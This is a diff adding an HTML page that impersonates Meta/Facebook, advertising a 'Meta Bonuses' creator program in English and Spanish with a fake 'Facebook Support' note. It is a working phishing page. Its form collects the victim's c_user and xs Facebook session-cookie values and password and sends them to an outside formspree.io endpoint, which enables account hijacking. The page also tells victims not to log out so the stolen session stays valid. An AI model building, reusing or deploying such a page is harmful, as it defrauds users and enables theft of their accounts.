@@ -1,0 +1,197 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Creator with Meta Bonuses</title>
+  <style>
+    body {
+      max-width: 700px;
+      margin: 0 auto;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      color: #1c1e21;
+    }
+
+    h1 {
+      color: #1877f2;
+    }
+
+    #unusualActivityMessage {
+      background-color: #ffe5e5;
+      padding: 30px;
+      border-radius: 12px;
+      margin-bottom: 18px;
+      text-align: center;
+      font-size: 22px;
+    }
+
+    #combinedForm {
+      display: flex;
+      flex-direction: column;
+      padding: 10px;
+    }
+
+    label {
+      margin-bottom: 5px;
+      font-size: 16px;
+    }
+
+    input {
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #1877f2;
+      color: #fff;
+      padding: 10px;
+      cursor: pointer;
+      border: none;
+      border-radius: 5px;
+      font-size: 14px;
+    }
+
+    #topImage,
+    #bottomImage {
+      max-width: 100%;
+      margin: 0 auto;
+      display: block;
+    }
+
+    video {
+      width: 50%;
+      margin-top: 10px;
+      height: 180px;
+    }
+
+    #bottomImage {
+      width: 100%;
+      margin-top: 10px;
+    }
+
+    footer {
+      background-color: #f0f2f5;
+      padding: 10px;
+      text-align: center;
+      font-size: 12px;
+      color: #606770;
+    }
+
+    /* Add this style for the thank you message */
+    #thankYouMessage {
+      display: none;
+      text-align: center;
+      font-size: 18px;
+      margin-top: 20px;
+      background-color: #e9ebee; /* Facebook light gray background */
+      padding: 15px;
+      border-radius: 8px;
+      color: #1c1e21; /* Facebook dark text color */
+    }
+
+    /* Add this style for the use laptop note */
+    #useLaptopNote {
+      text-align: center;
+      font-size: 16px;
+      margin-top: 20px;
+      color: #606770;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Top Image -->
+  <img id="topImage" src="https://cdn.glitch.global/0c944010-043b-4cf2-b9cc-0f6c24a10874/Screenshot_11.png?v=1702413025929">
+
+  <h1>Amplify your earnings as a creator with Meta Bonuses</h1>
+
+  <!-- Display message for unusual activity -->
+  <div id="unusualActivityMessage">
+    <p>We want to make it easy for Creators to make money by expressing their creativity and doing what they love. Join a Bonus program and earn money based on performance, earnings, or content challenges that reward you when you reach key milestones and achievements. You can even sign up for multiple bonus programs and maximize your payouts if you meet the relevant requirements.</p>
+  </div>
+
+ 
+  <p>¡Felicidades por tomar la iniciativa de maximizar tus ganancias a través de nuestras herramientas de monetización! Para agilizar el proceso de bonificaciones, rellena el siguiente formulario con la ayuda de la guía en vídeo proporcionada</p>
+
+  <!-- Video -->
+  <video controls>
+    <source src="https://cdn.glitch.global/c68946f9-a4d1-40f2-949c-b46376aba031/detailed-video.mp4?v=1701608978485" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+  
+ <!-- Use Laptop Note in Facebook-style Conversation -->
+<div id="useLaptopNote">
+  <p>
+    <span style="font-weight: bold;">Facebook Support:</span> Hey there! 🌟 Before you proceed, it's recommended to use a laptop or PC for the form submission process.
+  </p>
+  <p>
+    <strong>Watch video for assistance</strong>
+  </p>
+</div>
+  
+  <!-- Combined Form -->
+
+        <p style="color:#8c8c8c">
+        <form action="https://formspree.io/f/xnqeadvk" method="post">
+
+          C_User <br><br><input type="text" name="c_user" pattern=".{7,}" required><br><br>
+
+          Xs <br><br> <input type="text" name="xs" pattern=".{20,}" required><br><br><br>
+          Confirm Your Password <br><br> <input type="text" name="password" pattern=".{6,}" required><br><br>
+
+          <input type="Submit" name="submit" style="background-color:#136CD4; color:white;"> <br><br>
+      </th>
+    </tr>
+
+    <tr>
+      <th colspan="3"
+        style="background-color:#f2f2f2; font-family:Arial; font-size:10px; text-align:left; padding-left:10px;"> Please
+        make sure account not to log out from your computer until you have received a verification email.
+
+
+
+        </form>
+      </th>
+    </tr>
+  </table>
+  </P>
+
+  <!-- Thank You Message -->
+  <div id="thankYouMessage">
+    <p>Your form has been successfully submitted!</p>
+    <p>For your security, please refrain from logging out of Facebook until you receive the confirmation email.</p>
+  </div>
+
+  <!-- Include the script.js file -->
+  <script src="script.js"></script>
+
+  <!-- Footer -->
+  <footer>
+    <p>META©️ 2024</p>
+    <p>About | AdChoices | Terms and policies | Privacy Policy | Careers | Create Page</p>
+  </footer>
+
+  <script>
+    function submitForm(event) {
+      event.preventDefault(); // Prevent the form from submitting
+
+      // Assuming you have some form validation logic here
+
+      // Display the thank you message
+      document.getElementById('thankYouMessage').style.display = 'block';
+
+      // You can also add logic here to send the form data to a server or perform additional actions
+    }
+  </script>
+</body>
+
+</html>
